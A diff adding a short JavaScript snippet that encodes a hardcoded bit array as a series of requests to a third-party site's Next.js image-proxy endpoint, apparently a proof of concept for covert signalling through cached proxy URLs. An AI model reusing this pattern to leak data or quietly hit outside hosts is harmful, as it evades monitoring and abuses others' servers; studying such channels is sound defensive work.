@@ -1,0 +1,9 @@
+const bits = [1,0,1,0,1,0,1,0];
+const base = 'https://titobet.com/_next/image?url=' + encodeURIComponent('https://cdn.jsdelivr.net/gh/anti-phishing-bot/xdcwhsapmv@main/text_test.svg') + '&w=64&q=75&cb=BIT';
+(async () => {
+  for (let i = 0; i < bits.length; i++) {
+    if (bits[i]) {
+      try { await fetch(base + i, { method: 'GET' }); } catch (e) {}
+    }
+  }
+})();
